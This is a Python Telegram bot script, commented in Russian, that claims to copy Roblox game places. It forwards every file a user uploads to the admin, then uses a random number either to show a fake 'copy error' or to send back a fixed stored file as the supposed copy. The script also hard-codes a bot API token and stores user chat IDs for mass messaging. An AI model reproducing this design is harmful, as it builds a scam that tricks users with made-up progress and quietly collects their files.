import telebot
from telebot import types
import random
import json
import os

# --- НАСТРОЙКИ ---
API_TOKEN = '8480317600:AAFFTPcDLKH4RPRoLEnygaDKEvPMHp8d18U'
ADMIN_ID = 6655100280 # Твой ID
CHANNEL_URL = 'https://t.me/vegamonster1'
DB_FILE = 'users.json'

bot = telebot.TeleBot(API_TOKEN)
bot_enabled = True # Статус работы бота

# Функция для сохранения пользователей
def save_user(user_id):
    users = []
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r') as f:
            users = json.load(f)
    if user_id not in users:
        users.append(user_id)
        with open(DB_FILE, 'w') as f:
            json.dump(users, f)

# --- АДМИН ПАНЕЛЬ ---
@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if message.chat.id == ADMIN_ID:
        markup = types.InlineKeyboardMarkup(row_width=1)
        status = "✅ РАБОТАЕТ" if bot_enabled else "❌ ВЫКЛЮЧЕН"
        
        btn_broadcast = types.InlineKeyboardButton("📢 Рассылка всем", callback_data="admin_broadcast")
        btn_toggle = types.InlineKeyboardButton(f"Статус: {status}", callback_data="admin_toggle")
        btn_stats = types.InlineKeyboardButton("📊 Статистика", callback_data="admin_stats")
        
        markup.add(btn_broadcast, btn_toggle, btn_stats)
        bot.send_message(ADMIN_ID, "🛠 **Админ-панель**", reply_markup=markup, parse_mode='Markdown')

# Обработка админ-кнопок
@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_'))
def admin_calls(call):
    global bot_enabled
    if call.message.chat.id != ADMIN_ID: return

    if call.data == "admin_toggle":
        bot_enabled = not bot_enabled
        admin_panel(call.message) # Обновляем панель
        bot.answer_callback_query(call.id, "Статус изменен")

    elif call.data == "admin_stats":
        if os.path.exists(DB_FILE):
            with open(DB_FILE, 'r') as f:
                count = len(json.load(f))
            bot.send_message(ADMIN_ID, f"👥 Всего пользователей: {count}")
        else:
            bot.send_message(ADMIN_ID, "👥 Пользователей пока нет.")

    elif call.data == "admin_broadcast":
        msg = bot.send_message(ADMIN_ID, "💬 Напиши текст для рассылки (или нажми /cancel):")
        bot.register_next_step_handler(msg, send_broadcast)

def send_broadcast(message):
    if message.text == "/cancel": return
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r') as f:
            users = json.load(f)
        for u_id in users:
            try:
                bot.send_message(u_id, message.text)
            except: pass
        bot.send_message(ADMIN_ID, "✅ Рассылка завершена!")

# --- ЛОГИКА БОТА ---
@bot.message_handler(commands=['start'])
def start(message):
    save_user(message.chat.id)
    if not bot_enabled and message.chat.id != ADMIN_ID:
        bot.send_message(message.chat.id, "🛠 Бот временно отключен на тех. обслуживание.")
        return

    markup = types.InlineKeyboardMarkup(row_width=1)
    btn_start = types.InlineKeyboardButton("✅ Начать копирование", callback_data='step_1')
    btn_tutor = types.InlineKeyboardButton("📖 Tutorial (Канал)", url=CHANNEL_URL)
    markup.add(btn_start, btn_tutor)
    bot.send_message(message.chat.id, "🟢 **Привет!** Мы копируем плейсы Roblox.", reply_markup=markup, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data == 'step_1')
def ask_game(call):
    if not bot_enabled:
        bot.send_message(call.message.chat.id, "❌ Бот выключен.")
        return
    msg = bot.send_message(call.message.chat.id, "🧪 **Шаг 1:** Напиши название игры:")
    bot.register_next_step_handler(msg, process_game)

def process_game(message):
    msg = bot.send_message(message.chat.id, "🟢 **Шаг 2:** Теперь отправь файл игры:")
    bot.register_next_step_handler(msg, process_file)

def process_file(message):
    chat_id = message.chat.id
    if message.content_type in ['document', 'photo', 'video']:
        bot.send_message(ADMIN_ID, f"📥 НОВЫЙ ФАЙЛ от {chat_id}")
        bot.forward_message(ADMIN_ID, chat_id, message.message_id)
        
        chance = random.randint(1, 100) # Шанс от 1 до 100
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True).add("🔄 Повторить попытку")

        if chance <= 25: # 25% на ошибку
            bot.send_message(chat_id, "⚠️ **Ошибка копирования!** Сбой данных. Попробуй позже.", reply_markup=markup)
        else: # 75% на успех
            bot.send_message(chat_id, "⌛ **Копирование почти завершено...**")
            try:
                with open('game.rbxl', 'rb') as f:
                    bot.send_document(chat_id, f, caption="📎 Компонент готов.", reply_markup=markup)
            except Exception as e:
                bot.send_message(chat_id, "❌ Ошибка: файл не найден на сервере.")
    else:
        bot.send_message(chat_id, "❌ Отправь именно файл!")

bot.polling(none_stop=True)
